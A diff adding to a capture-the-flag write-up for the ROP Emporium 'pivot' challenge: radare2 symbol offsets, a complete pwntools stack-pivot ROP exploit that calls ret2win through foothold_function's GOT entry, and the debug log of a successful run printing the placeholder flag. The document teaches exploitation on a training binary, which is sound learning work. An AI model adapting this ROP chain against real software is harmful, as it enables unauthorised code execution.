@@ -1015,9 +1015,151 @@ Non-debugging symbols:
 0x0000000000400b80  __libc_csu_fini
 0x0000000000400b84  _fini
 ```
+
+### Function offset: foothold_function - ret2win
+```
+[root:~/Downloads/RopEmporium]# r2 -AAA ./libpivot.so 
+[Invalid instruction of 16331 bytes at 0x7cd entry0 (aa)
+Invalid instruction of 16330 bytes at 0x38
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+[x] Enable constraint types analysis for variables
+[0x00000870]> afl
+0x00000000    3 124  -> 109  sym.imp.__cxa_finalize
+0x000007f8    3 26           sym._init
+0x00000830    1 6            sym.imp.system
+0x00000840    1 6            sym.imp.printf
+0x00000850    1 6            sym.imp.exit
+0x00000860    1 6            sub.__gmon_start_860
+0x00000868    1 6            sub.__cxa_finalize_868
+0x00000870    4 50   -> 44   entry0
+0x000008b0    4 66   -> 57   sym.register_tm_clones
+0x00000900    5 50           sym.__do_global_dtors_aux
+0x00000940    4 48   -> 42   entry.init0
+0x00000970    1 24           sym.foothold_function
+0x00000988    1 31           sym.void_function_01
+0x000009a7    1 31           sym.void_function_02
+0x000009c6    1 31           sym.void_function_03
+0x000009e5    1 31           sym.void_function_04
+0x00000a04    1 31           sym.void_function_05
+0x00000a23    1 31           sym.void_function_06
+0x00000a42    1 31           sym.void_function_07
+0x00000a61    1 31           sym.void_function_08
+0x00000a80    1 31           sym.void_function_09
+0x00000a9f    1 31           sym.void_function_10
+0x00000abe    1 26           sym.ret2win
+0x00000ad8    1 9            sym._fini
+```
+```
+>>> hex(0x00000abe - 0x00000970)
+'0x14e'
+```
+
 ### Exploit (launch /bin/sh)
 ```
+# Import the library
+from pwn import *
+
+# Debugging
+context.log_level = 'debug'
+context.arch = 'amd64'
+context.terminal = ['tmux', 'splitw', '-v']
+
+# Binary has NX set - no typical BOF - 
+# Help info: http://docs.pwntools.com/en/stable/intro.html
+
+elf = ELF("pivot")
+
+# Gadgets
+#
+# Foothold plt and got
+foothold_plt = p64(0x00400850)
+foothold_got = p64(0x00602048)                # r2 -AAA ./libpivot.so; ir to show relocation got info.
+# Offset from foothold -> ret2win
+offset = p64(0x14e)
+# 0x0000000000400b00: pop rax; ret; 
+popRaxGadget = p64(0x0000000000400b00)
+# 0x0000000000400b02: xchg rax, rsp; ret;
+xchgGadget = p64(0x0000000000400b02)
+# Add rax 0x0000000000400b09: add rax, rbp; ret;
+addRaxGadget = p64(0x0000000000400b09)
+# 0x0000000000400b05: mov rax, qword ptr [rax]; ret;
+derefRaxGadget = p64(0x0000000000400b05)
+# 0x000000000040098e: call rax;
+jmpRaxGadget = p64(0x000000000040098e)
+# 0x0000000000400900: pop rbp; ret;
+popRbpGagdet = p64(0x0000000000400900)
+
+# The heap? Need to find the address of ret2win and call it.
+second_chain = foothold_plt
+second_chain += popRaxGadget
+second_chain += foothold_got
+second_chain += derefRaxGadget
+second_chain += popRbpGagdet
+second_chain += offset
+second_chain += addRaxGadget
+second_chain += jmpRaxGadget
+
+# GTG!
+io = elf.process()
+gdb.attach(io,"""
+b *pwnme+164
+continue
+""")
+io.sendline(second_chain)
+heap_address = p64(int(io.recvline_contains('The Old Gods kindly bestow upon you a place to pivot:').decode('UTF-8').split(' ')[-1].encode('ascii','ignore'),16))
+
+# Our second fgets overflow
+stack_smash = "a" * 40              # Stack smashing buffer
+stack_smash += popRaxGadget
+stack_smash += heap_address
+stack_smash += xchgGadget
+# 3 qwords space on the stack after our buffer
+
+io.sendline(stack_smash)
+io.interactive()
 ```
-### Result (launch /bin/sh)
+### Result
 ```
+[*] running in new terminal: /usr/bin/gdb -q  "/root/Downloads/RopEmporium/pivot" 12091 -x "/tmp/pwnVXsg_z.gdb"
+[DEBUG] Launching a new terminal: ['/usr/bin/tmux', 'splitw', '-v', '/usr/bin/gdb -q  "/root/Downloads/RopEmporium/pivot" 12091 -x "/tmp/pwnVXsg_z.gdb"']
+[+] Waiting for debugger: Done
+[DEBUG] Sent 0x41 bytes:
+    00000000  50 08 40 00  00 00 00 00  00 0b 40 00  00 00 00 00  │P·@·│····│··@·│····│
+    00000010  48 20 60 00  00 00 00 00  05 0b 40 00  00 00 00 00  │H `·│····│··@·│····│
+    00000020  00 09 40 00  00 00 00 00  4e 01 00 00  00 00 00 00  │··@·│····│N···│····│
+    00000030  09 0b 40 00  00 00 00 00  8e 09 40 00  00 00 00 00  │··@·│····│··@·│····│
+    00000040  0a                                                  │·│
+    00000041
+[DEBUG] Received 0xb7 bytes:
+    'pivot by ROP Emporium\n'
+    '64bits\n'
+    '\n'
+    'Call ret2win() from libpivot.so\n'
+    'The Old Gods kindly bestow upon you a place to pivot: 0x7f2e32ec5f10\n'
+    'Send your second chain now and it will land there\n'
+    '> '
+[DEBUG] Sent 0x41 bytes:
+    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
+    *
+    00000020  61 61 61 61  61 61 61 61  00 0b 40 00  00 00 00 00  │aaaa│aaaa│··@·│····│
+    00000030  10 5f ec 32  2e 7f 00 00  02 0b 40 00  00 00 00 00  │·_·2│.···│··@·│····│
+    00000040  0a                                                  │·│
+    00000041
+[*] Switching to interactive mode
+Send your second chain now and it will land there
+> [DEBUG] Received 0x23 bytes:
+    'Now kindly send your stack smash\n'
+    '> '
+Now kindly send your stack smash
+> [DEBUG] Received 0x54 bytes:
+    'foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so'
+foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so[DEBUG] Received 0x21 bytes:
+    'ROPE{a_placeholder_32byte_flag!}\n'
+ROPE{a_placeholder_32byte_flag!}
+[*] Process '/root/Downloads/RopEmporium/pivot' stopped with exit code 0 (pid 12091)
+[*] Got EOF while reading in interactive
+$  
 ```
